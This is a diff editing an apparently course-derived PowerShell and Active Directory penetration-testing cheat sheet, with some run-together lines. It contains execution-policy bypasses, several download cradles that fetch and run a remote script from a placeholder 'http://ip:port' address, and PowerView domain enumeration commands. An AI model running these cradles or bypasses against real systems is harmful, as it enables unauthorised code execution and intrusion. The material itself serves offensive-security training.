@@ -20,15 +20,16 @@ There are several ways to bypass it 
 powershell -ExecutionPolicy bypasspowershell -ep Bypass$env:PSExecutionPolicyPreference = "bypass"
 
 #Get-Help
-Get-Help Get-Item -- Shows a brief help about the cmdlet or topic. Supports wildcard (*). Comes with various options and filters. Get-Help -? or help -? -- could be used to display help.Get-Help About_<topic> could be used to get help for conceptual topics
+Get-Help Get-Item -- Shows a brief help about the cmdlet or topic. Supports wildcard (*). Comes with various options and filters. Get-# Help -? or help -? -- could be used to display help.Get-Help About_<topic> could be used to get help for conceptual topics
 Get-Help * --Lists everything about the help topics.
 Get-Help process --List everything which contains the word process.
-Update-Help --Updates the help system (v3+)
+#Update-Help --Updates the help system (v3+)
 Get-Help Get-Item -Full --List full help about a topic (Get-Item cmdlet in this case).
 Get-Help Get-Item -Examples --Lists example of how to run a cmdlet (Get-Item cmdlet in this case).
 
 #What is cmdlets ?
-Cmdlets are used to perform an action and a .Net object is returned as the output. Cmdlets accept parameters for different operations. They have aliases. There are NOT executables, you can write your own cmdlet with few lines of script. Get-Command -CommandType cmdlet -- This list all the cmdlets in the current powershell session
+#Cmdlets are used to perform an action and a .Net object is returned as the output. Cmdlets accept parameters for different operations. #They have aliases. There are NOT executables, you can write your own cmdlet with few lines of script.
+Get-Command -CommandType cmdlet -- This list all the cmdlets in the current powershell session
 Get-Process --Lists processes running on the system.
 
 #Powershell Modules basic
@@ -38,6 +39,7 @@ Get-Command -Module <modulename> -- Get all the commands which is imported from 
 ##Download Cradles
 iex (New-Object Net.WebClient).DownloadString('http://ip:port/file.ps1')
 $ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://ip:port/file.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
+
 #Powershell v3 onwards
 iex(iwr 'http://ip:port/file.ps1')
 $h = New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET', 'http://ip:port/file.ps1', $false);$h.send();iex $h.responseText
@@ -50,8 +52,8 @@ $wr = [System.Net.WebRequest]::Create("http://ip:port/file.ps1")$r = $wr.GetResp
 • Native Executables
 • Powershell (.Net Classes & WMI)
 
-Domain Enumeration
-Enumeration is most important during any engagement. Command to find the current domain name using .Net Classes
+#Domain Enumeration
+#Enumeration is most important during any engagement. Command to find the current domain name using .Net Classes
 $ADClass = [System.DirectoryServices.ActiveDirectory.Domain]$ADClass::GetCurrentDomain()
 Load PowerView
 cd C:\AD\Tools. .\PowerView.ps1
@@ -60,12 +62,14 @@ cd C:\AD\Tools\ADModule-master\Import-Module .\Microsoft.ActiveDirectory.Managem
 Get Current Domain Information
 #PowerViewGet-NetDomain
 #AD ModuleGet-ADDomain
-Get object of another domain
+#Get object of another domain
 #PowerViewGet-NetDomain -Domain moneycorp.local
 #AD ModuleGet-ADDomain -Identity moneycorp.local
-Find Domain SID
-#PowerViewGet-DomainSID
-#AD Module(Get-ADDomain).DomainSID
+#Find Domain SID
+#PowerView 
+Get-DomainSID
+#AD Module
+(Get-ADDomain).DomainSID
 Get Domain policy for current domain
 #PowerViewGet-DomainPolicy(Get-DomainPolicy)."system access" --Password Policy
 (Get-DomainPolicy)."Kerberos Policy" --Kerberos Policy
